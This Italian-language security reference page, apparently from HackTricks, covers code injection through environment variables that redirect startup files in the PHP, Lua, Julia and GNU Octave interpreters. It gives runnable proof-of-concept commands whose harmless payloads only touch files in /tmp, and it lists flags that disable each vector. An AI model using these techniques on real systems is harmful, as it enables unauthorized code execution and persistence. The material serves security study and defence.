# Injection di file di avvio dell'interprete macOS

{{#include ../../../banners/hacktricks-training.md}}

Queste tecniche specifiche del runtime usano variabili d'ambiente ereditate per selezionare una configurazione di avvio o del codice da eseguire prima dello script previsto. Lua supporta anche una variante con codice inline.

## Configurazione di avvio PHP

### `PHPRC` / `PHP_INI_SCAN_DIR` e `auto_prepend_file`

PHP CLI e CGI leggono la configurazione a ogni esecuzione. `PHPRC` può selezionare un `php.ini` leggibile dall'attaccante, mentre `PHP_INI_SCAN_DIR` può reindirizzare la directory in cui vengono cercati ulteriori file `.ini`. La direttiva `auto_prepend_file` fa sì che PHP analizzi un file prima dello script richiesto, trasformando questa combinazione in esecuzione di codice all'avvio.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini

PHPRC=/tmp/attacker-php.ini php victim.php
```

Un'alternativa è una directory contenente un file `.ini`:

```bash
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```

L'opzione `-n` ignora `php.ini`; un percorso `-c` esplicito e attendibile ha la precedenza su `PHPRC`. Ricorda che un SAPI server a esecuzione prolungata normalmente legge la configurazione all'avvio del server web, mentre CLI e CGI lo fanno a ogni invocazione.<sup>[[1]](#references)</sup>

## Codice di avvio Lua

### `LUA_INIT`

Prima di elaborare le opzioni della riga di comando o lo script di destinazione, l'interprete Lua autonomo esegue `LUA_INIT_<major>_<minor>` oppure, se la variabile con versione non è presente, `LUA_INIT`. Un valore che inizia con `@` indica un file; qualsiasi altro valore viene valutato direttamente come codice Lua. Questo consente l'esecuzione all'avvio sia basata su file sia fileless.<sup>[[3]](#references)</sup>

```bash
# File-backed
echo 'os.execute("touch /tmp/lua-init-executed")' >/tmp/lua-init.lua
LUA_INIT_5_4=@/tmp/lua-init.lua lua victim.lua

# Fileless
LUA_INIT='os.execute("touch /tmp/lua-inline-executed")' lua victim.lua
```

Il nome esatto, comprensivo della versione, varia in base all’interprete, ad esempio `LUA_INIT_5_4`. `lua -E` ignora tutte le variabili d’ambiente, compresi il codice di avvio e i percorsi dei moduli Lua.

## Depot di avvio di Julia

### `JULIA_DEPOT_PATH` e `startup.jl`

All’avvio, Julia esegue normalmente `config/startup.jl` dal suo primo depot. `JULIA_DEPOT_PATH` controlla l’elenco dei depot, quindi impostarlo su un albero leggibile da un attacker reindirizza il file di avvio caricato automaticamente.<sup>[[4]](#references)[[5]](#references)</sup>

```bash
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl

# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```

Il separatore finale è utile se la vittima ha ancora bisogno dei suoi normali pacchetti. `julia --startup-file=no` disabilita questo file di avvio. Cancella la variabile prima dell’avvio, perché controlla anche i registri dei pacchetti, gli ambienti, le cache e i percorsi di caricamento del codice.

## File di avvio di GNU Octave

### `OCTAVE_SITE_INITFILE` / `OCTAVE_VERSION_INITFILE`

Durante l’avvio, GNU Octave esegue diversi file contenenti comandi Octave validi. `OCTAVE_SITE_INITFILE` sostituisce il file di avvio globale per il sito e `OCTAVE_VERSION_INITFILE` sostituisce quello specifico della versione, consentendo a entrambe le variabili di reindirizzare l’esecuzione automatica a un file leggibile dall’attaccante.<sup>[[6]](#references)</sup>

```bash
cat >/tmp/octave-startup.m <<'OCTAVE'
system('touch /tmp/octave-startup-executed');
OCTAVE

OCTAVE_SITE_INITFILE=/tmp/octave-startup.m octave-cli --quiet victim.m
```

`--no-init-file` salta solo i file dell'utente, come `~/.octaverc`; **non** impedisce l'override del file di sistema menzionato sopra. Usa `--no-site-file` per i file di sistema oppure `--norc` / `-f` per disabilitare tutti i file di avvio.<sup>[[7]](#references)</sup>

## References

- [1] [File di configurazione PHP](https://www.php.net/manual/en/configuration.file.php)
- [2] [PHP `auto_prepend_file`](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)
- [3] [Interprete standalone Lua 5.4](https://www.lua.org/manual/5.4/manual.html#7)
- [4] [Interfaccia a riga di comando Julia: file di avvio](https://docs.julialang.org/en/v1/manual/command-line-interface/#Startup-file)
- [5] [Variabili d'ambiente Julia: `JULIA_DEPOT_PATH`](https://docs.julialang.org/en/v1/manual/environment-variables/#JULIA_DEPOT_PATH)
- [6] [File di avvio di GNU Octave](https://docs.octave.org/latest/Startup-Files.html)
- [7] [Opzioni della riga di comando di GNU Octave](https://docs.octave.org/latest/Command-Line-Options.html)
{{#include ../../../banners/hacktricks-training.md}}
